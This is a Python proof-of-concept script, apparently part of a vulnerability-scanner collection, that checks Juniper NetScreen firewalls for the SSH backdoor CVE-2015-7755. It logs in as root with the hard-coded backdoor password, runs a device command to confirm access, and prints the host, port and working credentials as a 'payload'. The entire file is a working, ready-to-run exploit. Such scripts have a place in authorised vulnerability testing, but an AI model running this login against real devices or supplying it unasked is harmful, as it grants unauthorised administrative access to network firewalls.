#!/usr/bin/env python
# -*- coding: utf-8 -*-
'''
name: juniper NetScreen防火墙后门(CVE-2015-7755)
referer: http://www.freebuf.com/news/90323.html
author: Lucifer
description: ssh后门。
'''
import sys
from urllib.parse import urlparse
try :
    from pexpect import pxssh

    class juniper_netscreen_backdoor_BaseVerify:
        def __init__(self, url):
            self.url = url

        def run(self):
            port = 22
            if r"http" in self.url:
                # 提取host
                host = urlparse(self.url)[1]
                try:
                    port = int(host.split(':')[1])
                except:
                    pass
                flag = host.find(":")
                if flag != -1:
                    host = host[:flag]
            else:
                host = self.url

            try:
                user = "root"
                password = "<<< %s(un='%s') = %u"
                s = pxssh.pxssh()
                s.login(host, user, password, port, auto_prompt_reset=False)
                s.sendline(b'Get int')
                s.prompt()
                if s.before.find(b'Interfaces') is not -1:
                    s.logout()
                    return "[+]存在juniper NetScreen防火墙后门(CVE-2015-7755)漏洞...(高危)\tpayload: " + host + ":" + str(
                        port) + " " + user + ":" + password
                else:
                    s.logout()
                    return "[-]no vuln"
            except:
                return "[-] ======>连接超时"
except:
    class juniper_netscreen_backdoor_BaseVerify:
        def __init__(self, url):
            self.url = url

        def run(self):
            return "[-]"


if __name__ == "__main__":
    testVuln = juniper_netscreen_backdoor_BaseVerify(sys.argv[1])
    testVuln.run()
